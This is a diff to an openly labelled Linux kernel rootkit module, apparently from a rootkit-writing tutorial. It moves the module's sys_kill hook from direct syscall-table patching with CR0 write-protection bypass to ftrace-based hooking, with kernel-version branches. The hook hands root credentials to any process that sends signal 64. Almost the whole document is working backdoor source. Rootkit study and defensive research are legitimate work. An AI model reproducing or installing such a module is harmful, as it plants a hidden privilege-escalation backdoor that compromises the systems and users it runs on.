@@ -3,16 +3,30 @@
 #include <linux/kernel.h>
 #include <linux/syscalls.h>
 #include <linux/kallsyms.h>
+#include <linux/version.h>
+
+#include "ftrace_helper.h"
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("TheXcellerator");
 MODULE_DESCRIPTION("Giving root privileges to a process");
 MODULE_VERSION("0.01");
 
-static unsigned long * __sys_call_table;
+/* After Kernel 4.17.0, the way that syscalls are handled changed
+ * to use the pt_regs struct instead of the more familiar function
+ * prototype declaration. We have to check for this, and set a
+ * variable for later on */
+#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
+#define PTREGS_SYSCALL_STUBS 1
+#endif
 
-typedef asmlinkage long (*orig_kill_t)(const struct pt_regs *);
-orig_kill_t orig_kill;
+/* We now have to check for the PTREGS_SYSCALL_STUBS flag and
+ * declare the orig_kill and hook_kill functions differently
+ * depending on the kernel version. This is the largest barrier to 
+ * getting the rootkit to work on earlier kernel versions. The
+ * more modern way is to use the pt_regs struct. */
+#ifdef PTREGS_SYSCALL_STUBS
+static asmlinkage long (*orig_kill)(const struct pt_regs *);
 
 /* We can only modify our own privileges, and not that of another
  * process. Just have to wait for signal 64 (normally unused) 
@@ -34,6 +48,24 @@ asmlinkage int hook_kill(const struct pt_regs *regs)
 	return orig_kill(regs);
 
 }
+#else
+/* This is the old way of declaring a syscall hook */
+static asmlinkage long (*orig_kill)(pid_t pid, int sig);
+
+static asmlinkage int hook_kill(pid_t pid, int sig)
+{
+	void set_root(void);
+
+	if ( sig == 64 )
+	{
+		printk(KERN_INFO "rootkit: giving root...\n");
+		set_root();
+		return 0;
+	}
+
+	return orig_kill(pid, sig);
+}
+#endif
 
 /* Whatever calls this function will have it's creds struct replaced
  * with root's */
@@ -56,63 +88,29 @@ void set_root(void)
 	commit_creds(root);
 }
 
-/* The built in linux write_cr0() function stops us from modifying
- * the WP bit, so we write our own instead */
-inline void cr0_write(unsigned long cr0)
-{
-	asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
-}
-
-/* Bit 16 in the cr0 register is the W(rite) P(rotection) bit which
- * determines whether read-only pages can be written to. We are modifying
- * the syscall table, so we need to unset it first */
-static inline void protect_memory(void)
-{
-	unsigned long cr0 = read_cr0();
-	set_bit(16, &cr0);
-	cr0_write(cr0);
-}
-
-static inline void unprotect_memory(void)
-{
-	unsigned long cr0 = read_cr0();
-	clear_bit(16, &cr0);
-	cr0_write(cr0);
-}
+/* Declare the struct that ftrace needs to hook the syscall */
+static struct ftrace_hook hooks[] = {
+	HOOK("sys_kill", hook_kill, &orig_kill),
+};
 
 /* Module initialization function */
 static int __init rootkit_init(void)
 {
-	/* Grab the syscall table */
-	__sys_call_table = kallsyms_lookup_name("sys_call_table");
-
-	/* Grab the function pointer to the real sys_kill syscall */
-	orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
+	/* Hook the syscall and print to the kernel buffer */
+	int err;
+	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
+	if(err)
+		return err;
 
 	printk(KERN_INFO "rootkit: Loaded >:-)\n");
-	printk(KERN_DEBUG "rootkit: Found the syscall table at 0x%lx\n", __sys_call_table);
-	printk(KERN_DEBUG "rootkit: kill @ 0x%lx\n", orig_kill);
-	
-	unprotect_memory();
-
-	printk(KERN_INFO "rootkit: hooking kill syscall\n");
-	/* Patch the function pointer to sys_kill with our hook instead */
-	__sys_call_table[__NR_kill] = (unsigned long)hook_kill;
-
-	protect_memory();
 
 	return 0;
 }
 
 static void __exit rootkit_exit(void)
 {
-	unprotect_memory();
-	
-	printk(KERN_INFO "rootkit: restoring kill syscall\n");
-	__sys_call_table[__NR_kill] = (unsigned long)orig_kill;
-	
-	protect_memory();
-	
+	/* Unhook and restore the syscall and print to the kernel buffer */
+	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
 	printk(KERN_INFO "rootkit: Unloaded :-(\n");
 }
 
